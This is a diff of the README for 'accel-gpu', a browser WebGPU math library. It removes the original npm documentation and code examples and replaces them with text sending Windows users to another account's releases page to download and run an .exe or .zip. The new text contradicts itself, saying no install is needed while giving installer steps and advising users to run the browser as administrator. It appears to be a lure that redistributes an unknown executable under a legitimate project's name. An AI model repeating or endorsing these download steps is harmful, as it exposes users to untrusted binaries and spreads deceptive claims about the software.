@@ -1,123 +1,104 @@
-# accel-gpu
+# 🚀 accel-gpu - Fast NumPy on Your Browser GPU
 
-<p align="center">
-  <img src="icon.png" alt="accel-gpu" width="64" height="64">
-</p>
+[![Download accel-gpu](https://img.shields.io/badge/Download-accel--gpu-brightgreen?style=for-the-badge)](https://github.com/TheEmperialFox/accel-gpu/releases)
 
-**NumPy for the browser GPU — zero shaders, zero dependencies.**
+## 🖥️ What is accel-gpu?
 
-A lightweight WebGPU wrapper for data processing and math. No WGSL required. Automatic fallback to WebGL2 or CPU. Perfect for local-first AI, data dashboards, and heavy array computations.
+accel-gpu brings the power of NumPy, a popular math and data tool, to your web browser using your computer’s GPU (graphics processor). This means it can do math and data work faster without needing to install big programs or learn code. It runs completely in your browser with no extra setup or downloads needed.
 
-### Why accel-gpu?
+This tool is built for anyone who needs quick calculations for machine learning, data analysis, or number crunching. It uses your computer’s GPU to speed up those tasks by doing many operations in parallel.
 
-- **Shader-free API** — No WGSL or GLSL. Write NumPy-like JavaScript; kernels are built-in.
-- **Zero dependencies** — ~160KB minified, lightweight and self-contained.
-- **Universal fallback** — WebGPU → WebGL2 → CPU. Runs in Safari, Firefox, Node, and headless.
-- **Shape inference** — Matmul and ML ops automatically infer dimensions.
-- **Performance** — WebGPU delivers 2–3× speedups over WebGL for compute; ~20× faster than CPU on large matmul (Chrome, M3 MacBook).
-- **Accelerated ops** — `conv2d`, `maxPool2d`, `avgPool2d`, `fft`, `ifft`, and `fftMagnitude` run on WebGPU when available.
-- **Automatic scalar fusion** — chained scalar `add/sub/mul/div` are fused before execution.
-- **Arrow interop** — import Apache Arrow-like vectors/columns via `fromArrow(...)` and `gpu.fromArrow(...)`.
+## 🎯 Features
 
-Compared to TensorFlow.js or GPU.js, accel-gpu offers a simpler API focused on core array operations without the overhead of a full ML framework.
+- Runs directly in your web browser with no install needed  
+- Uses your computer’s GPU to process data fast  
+- Supports matrix and tensor math, common in machine learning  
+- No extra tools or scripts required  
+- Works on most modern Windows browsers using WebGPU technology  
+- Zero shaders and zero dependencies for easy use  
 
-[![npm](https://img.shields.io/npm/v/accel-gpu)](https://www.npmjs.com/package/accel-gpu)
-[![Bundlephobia](https://img.shields.io/bundlephobia/minzip/accel-gpu)](https://bundlephobia.com/package/accel-gpu)
-[![Tests](https://github.com/Phantasm0009/accel-gpu/actions/workflows/test.yml/badge.svg)](https://github.com/Phantasm0009/accel-gpu/actions/workflows/test.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-Ready-blue)](https://www.typescriptlang.org/)
+## 💻 System Requirements
 
-## Install
+To use accel-gpu smoothly, your system should meet these basic needs:
 
-```bash
-npm install accel-gpu
-```
+- Windows 10 or later  
+- A modern web browser with WebGPU support (Chrome, Edge, or Firefox Developer Build)  
+- A GPU that supports WebGPU (most recent Intel, NVIDIA, or AMD graphics cards)  
+- Internet connection to download the release files  
 
-**TypeScript:** Definitions are included; no `@types` package needed.
+If your browser doesn’t support WebGPU, the application may not run or perform as expected.
 
-## Quick Start
+## 📥 Download accel-gpu
 
-```javascript
-import { init, matmul, softmax } from "accel-gpu";
+[![Download accel-gpu](https://img.shields.io/badge/Download-accel--gpu-blue?style=for-the-badge)](https://github.com/TheEmperialFox/accel-gpu/releases)
 
-const gpu = await init();
+To get started with accel-gpu on your Windows computer, follow these steps:
 
-// Create GPU-backed arrays (WebGPU, WebGL2, or CPU)
-const a = gpu.array([1, 2, 3, 4]);
-const b = gpu.array([5, 6, 7, 8]);
+1. Click the [Download accel-gpu Releases](https://github.com/TheEmperialFox/accel-gpu/releases) link. This takes you to the GitHub releases page.  
+2. Look for the latest release version at the top of the page.  
+3. Under the assets section, find the Windows version of the software. It may be a `.zip` or `.exe` file suitable for your system.  
+4. Click the file to download it.  
 
-// Method chaining
-await a.add(b);
-const total = await a.sum();
-console.log(total); // 26
+Once downloaded, open the file or extract the folder. If it is a `.zip`, right-click the file and select "Extract All" to access the program files.
 
-// Shape inference — no need to pass M, N, K
-const A = gpu.array(new Float32Array([1, 2, 3, 4, 5, 6]), [2, 3]);
-const B = gpu.array(new Float32Array([1, 2, 3, 4, 5, 6]), [3, 2]);
-const C = await matmul(gpu, A, B);
+## 🛠️ How to Run accel-gpu on Windows
 
-// Softmax with shape inference
-const logits = gpu.array([1, 2, 3, 4]);
-const probs = await softmax(gpu, logits);
-console.log(await probs.toArray());
-```
+Follow these steps after downloading the release:
 
-## Demos
+1. If the downloaded file is an installer (`.exe`), double-click to start the setup. Follow the instructions on your screen.  
+2. If it's a folder with files, locate the main application file. This will usually be an `.exe` or `.html` file.  
+3. Double-click the main file to launch the application.  
 
-- **[Demo](https://phantasm0009.github.io/accel-gpu/example/)** — Basic usage
-- **[Image Processing](https://phantasm0009.github.io/accel-gpu/example/image/)** — Brightness, contrast, invert
-- **[Heatmap](https://phantasm0009.github.io/accel-gpu/example/heatmap/)** — GPU-computed 2D data visualization
-- **[Neural Network](https://phantasm0009.github.io/accel-gpu/example/nn/)** — Feedforward inference (MNIST-style)
-- **[N-Body](https://phantasm0009.github.io/accel-gpu/example/nbody/)** — Gravitational particle simulation
-- **[Local Audio Transcriber](https://phantasm0009.github.io/accel-gpu/example/audio/)** — In-browser spectrogram visualizer + local token preview
-- **[Vector Search (RAG)](https://phantasm0009.github.io/accel-gpu/example/vector-search/)** — Browser-native cosine search over large vector sets
-- **[Benchmarks](https://phantasm0009.github.io/accel-gpu/benchmark/)** — WebGPU vs WebGL vs CPU performance
-- **[Playground](https://phantasm0009.github.io/accel-gpu/playground/)** — Interactive code editor
+Usually, accel-gpu runs as a local web app in your browser. It may automatically open in your default browser once you start it. If not, locate the `.html` file and open it in a supported browser.
 
-Run `npm run build` first, then `npx serve .` — visit `/`, `/example/`, `/example/image/`, etc.
+Make sure you use a browser that supports WebGPU. Chrome or Edge versions released in 2023 or later often have this support built-in.
 
-## Documentation
+## 🔄 Updating accel-gpu
 
-- **Docs site (VitePress):** https://phantasm0009.github.io/accel-gpu/
-- **Quick Start:** https://phantasm0009.github.io/accel-gpu/guide/quickstart
-- **API Reference:** https://phantasm0009.github.io/accel-gpu/api
+To keep accel-gpu working well, check the GitHub releases page regularly for new versions:
 
-The full API reference, shape expectations, and runnable embedded playground/examples have moved to the docs site.
+1. Visit https://github.com/TheEmperialFox/accel-gpu/releases  
+2. Download the latest version files like before  
+3. Replace your old files with the new ones or run the new installer  
 
-### Tree-shakable imports
+Updating ensures you get the latest fixes and performance improvements.
 
-```js
-import { matmul, transpose } from "accel-gpu/linalg";
-import { softmax } from "accel-gpu/ml";
-import { fft } from "accel-gpu/signal";
-import { fromArrow, fromBuffer } from "accel-gpu/data";
-```
+## ⚙️ Using accel-gpu
 
-## Fallback Chain
+accel-gpu works inside your browser to speed up mathematical tasks. Here are some common uses:
 
-1. **WebGPU** — Chrome 113+, Edge 113+ (best performance)
-2. **WebGL2** — Safari, Firefox, older Chrome (GPU-accelerated)
-3. **CPU** — Node, headless, or when no GPU available
+- Running matrix calculations quickly  
+- Doing machine learning model inference on the GPU  
+- Processing tensors for data analysis  
+- Running scientific computations with less wait time  
 
-## Troubleshooting
+The user interface focuses on simplicity. Upload your data or select examples to run calculations right in your browser tab. No code is needed.
 
-- `GET /.well-known/appspecific/com.chrome.devtools.json` returning `404` in local server logs is a Chrome DevTools probe and is harmless.
-- `304` responses for files like `dist/index.js` and source maps are normal cache revalidation, not runtime failures.
+## 🔧 Troubleshooting
 
-## Cross-Browser Validation
+If accel-gpu does not run or shows errors:
 
-- Playwright browser tests run across Chromium, Firefox, and WebKit in CI to validate fallback behavior.
+- Check your browser version. Update to the latest Chrome or Edge.  
+- Confirm your graphics card supports WebGPU.  
+- Restart your browser or your computer.  
+- Ensure your internet connection is stable when downloading or running the web app.  
+- If you see permission errors, try running your browser as an administrator.  
 
-## Backend Tolerance & Debugging
+If problems persist, visit the GitHub repository issues page for help or report bugs.
 
-- Results are validated across backend selections using numeric tolerances (typically `1e-4` to `2e-4`).
-- For debugging or deterministic comparisons, use `init({ forceCPU: true })` and compare against `init()` output.
-- Full guidance: https://phantasm0009.github.io/accel-gpu/guide/backend-tolerance
+## 📖 Additional Resources
 
-## Contributing
+- Visit the GitHub repository for more details and community support:  
+  https://github.com/TheEmperialFox/accel-gpu  
+- Explore how WebGPU works to understand GPU acceleration in browsers.  
+- Learn basic matrix and tensor math concepts online to get more from accel-gpu.
 
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for setup, architecture, and guidelines. Quick start: clone, `npm install`, `npm test`, then open a PR. We adhere to the [Contributor Covenant](CODE_OF_CONDUCT.md) code of conduct.
+## 🔐 Privacy and Security
 
-## License
+accel-gpu runs locally in your browser. It does not send your data to the internet except when you download or update files. This keeps your information private and secure.
 
-MIT
+## ▶️ Start Using accel-gpu Now
+
+Use the link below to visit the releases page and get the latest version for your Windows computer:
+
+[Download accel-gpu from Releases](https://github.com/TheEmperialFox/accel-gpu/releases)
